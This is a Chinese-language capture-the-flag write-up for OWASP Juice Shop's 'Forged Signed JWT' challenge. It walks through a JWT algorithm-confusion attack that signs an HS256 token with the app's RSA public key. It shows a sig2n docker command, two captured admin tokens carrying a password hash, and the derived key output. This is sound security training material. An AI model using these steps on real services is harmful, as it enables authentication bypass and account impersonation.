---
title: Forged Signed JWT
description: 爆破目录得到 JWT 公钥文件所在路径，使用此公钥进行签名。默认单词表不包含此文件名，需扩展单词表。若无法得到公钥文件而使用多个 JWT 生成公钥，还需多次进行格式调整以猜测应用程序的 JWT 公钥文件实际保存格式。
---

- 描述：伪造一个几乎正确RSA签名的JWT令牌，该令牌冒充（不存在的）用户```rsa_lord@juice-sh.op```。

- 对应 JWT 算法混淆攻击
    https://portswigger.net/web-security/jwt/algorithm-confusion

- 在已知文件中尝试搜索 JWT 公钥信息
    - 在安全策略文件中
    ```http://127.0.0.1:3000/.well-known/security.txt```
    仅包含 PGP 公钥
    - 尝试直接访问或本地文件读取漏洞 
    ```/jwks.json``` 或 ```/.well-known/jwks.json``` 路径
    均不存在对应文件
- 示例解决方案
    > 启用了目录列表的目录中包含 JWT 公钥文件
    http://localhost:3000/encryptionkeys

- 核心是使用与应用程序 JWT 公钥文件内容完全相同的 Base64 编码的字符串作为对称密钥进行签名。
    - 若已获得文件，则无需格式化，直接使用内容
    - 若未获得文件，需猜测服务器公钥文件的格式，例如最后的空行、字符串是一行还是换行

1. 复制公钥文件的全部内容到解码器进行 Base64 编码
2. 使用扩展新建对称密钥后将编码后的字符串复制到 ```"k"``` 字段的值
3. 修改 JWT 内容后使用此对称密钥进行签名，同时生成头部 ```"alg": "HS256"```
4. 发送后返回有效响应




- 另一种方法：使用现有令牌推导公钥
    ```docker run --rm -it portswigger/sig2n <token1> <token2>```
    token1
    ```eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTcuMC4xIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTEyLTE2IDAxOjQyOjQ1LjU0NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTEyLTE2IDA0OjI5OjQ3LjI4MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NjU4NjE1Mzl9.eWHvic4ecDSrrU81yKDs_N54Q0MyRpifxT5dDqU_Xl1yG02R2gOjPVoildIOCXViwPFTnd-JW9E2FS-RFRfn8CnDTaieYVMqosiWbK9uJRky3641nJ_2i0wUY8PaWoz65aFNDN6vfFSPZ_bHzTsdUUUxVfyO0iFmho2dEoyETzA```
    token2
    ```eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxNzIuMTcuMC4xIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTEyLTE2IDAxOjQyOjQ1LjU0NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTEyLTE2IDA0OjI5OjQ3LjI4MyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NjU4NjEzMTd9.JJVxJv6Kl2URT5jbp1IOgNTMv5FCa2V11Tei-eirHeFJ79KuTHSyTNqqFDt9IzeXfCuhKfCmI-jxn3MRij2mN1flmStGAKsK4prx8bhfc2wpwId8Qs_sxX1ua_lgAiVuJXQsV0kRtN2v_VFR8f7ihwAjtQn2KGo5beqpGWOZ164```
    - 输出公钥的 Base64编码
    ```
    Found n with multiplier 1:
    Base64 encoded x509 key: 
    LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FETndxTEVlOXdnVFhDYkM3K1JQZERiQmJlcQpqZGJzNGtPUE9JR3pxTHBYdkpYbHh4VzhpTXowRWFNNEJLVXFZc0lhK25kdjNOQW4yUnhDZDV1YlZkSkpjWDQzCnpPNktvMFRGRVp4LzY1Z1kzQkUwTzZzeUNFbVVQNHFiU2Q2ZXhvdS9GK1dUSVN6YlE1RkJWUFZtaG5ZaEcva3AKd3QvY0l4SzVpVW41aG0rNHRRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=

    Base64 encoded pkcs1 key: 
    LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JR0pBb0dCQU0zQ29zUjczQ0JOY0pzTHY1RTkwTnNGdDZxTjF1emlRNDg0Z2JPb3VsZThsZVhIRmJ5SXpQUVIKb3pnRXBTcGl3aHI2ZDIvYzBDZlpIRUozbTV0VjBrbHhmamZNN29xalJNVVJuSC9ybUJqY0VUUTdxeklJU1pRLwppcHRKM3A3R2k3OFg1Wk1oTE50RGtVRlU5V2FHZGlFYitTbkMzOXdqRXJtSlNmbUdiN2kxQWdNQkFBRT0KLS0tLS1FTkQgUlNBIFBVQkxJQyBLRVktLS0tLQo=
    ```
    - 此处对应 pkcs1 key，但无法直接使用。
        - 解码后公钥拥有换行符，而已知服务器文件为单行
        - 于是需使用不同格式猜测服务器公钥文件格式
        - 去掉 Base64字符串之间的空白符，且末尾不包含换行后得到与服务器公钥文件内容完全相同的字符串